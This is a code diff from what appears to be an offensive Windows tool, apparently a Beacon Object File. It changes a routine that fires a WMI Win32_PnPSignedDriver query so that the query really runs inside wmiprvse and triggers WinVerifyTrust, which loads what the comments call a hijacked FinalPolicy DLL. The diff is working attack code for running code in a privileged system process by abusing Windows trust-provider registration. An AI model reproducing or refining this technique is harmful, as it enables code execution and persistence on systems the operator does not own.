@@ -401,9 +401,9 @@ static void restore_finalpolicy(IWbemServices *pSvc, const char *guid, FP_BACKUP
  * load our hijacked FinalPolicy DLL.
  * ================================================================ */
 static BOOL trigger_wmi(IWbemServices *pSvc) {
-    /* Match sipexec.py: use WHERE DeviceName="null" (matches nothing, returns fast).
-     * The query just needs to FIRE inside wmiprvse to trigger WVT.
-     * Use RETURN_IMMEDIATELY -- don't wait for results. */
+    /* ponytail: WBEM_FLAG_RETURN_IMMEDIATELY is lazy -- query only runs when
+     * you iterate via Next(). Must drain the enumerator to force execution
+     * inside wmiprvse, which triggers WVT FinalPolicy. */
     BSTR bstrWQL = OLEAUT32$SysAllocString(L"WQL");
     BSTR bstrQuery = OLEAUT32$SysAllocString(L"SELECT * FROM Win32_PnPSignedDriver WHERE DeviceName=\"null\"");
 
@@ -419,12 +419,20 @@ static BOOL trigger_wmi(IWbemServices *pSvc) {
         return FALSE;
     }
 
-    /* Don't wait for results -- just let the query fire.
-     * wmiprvse processes it internally and calls WVT. */
-    if (pEnum) pEnum->Release();
+    /* Drain the enumerator -- this forces wmiprvse to actually execute the query.
+     * WHERE DeviceName="null" matches nothing, so this returns immediately after
+     * the provider scans and calls WVT for signature checks. */
+    if (pEnum) {
+        IWbemClassObject *pObj = NULL;
+        ULONG ret = 0;
+        while (pEnum->Next(10000, 1, &pObj, &ret) == S_OK && ret > 0) {
+            pObj->Release();
+            ret = 0;
+        }
+        pEnum->Release();
+    }
 
     TMB_INFO("WMI trigger fired (Win32_PnPSignedDriver)");
-    /* Give wmiprvse time to process the query and call WVT */
     KERNEL32$Sleep(3000);
     return TRUE;
 }
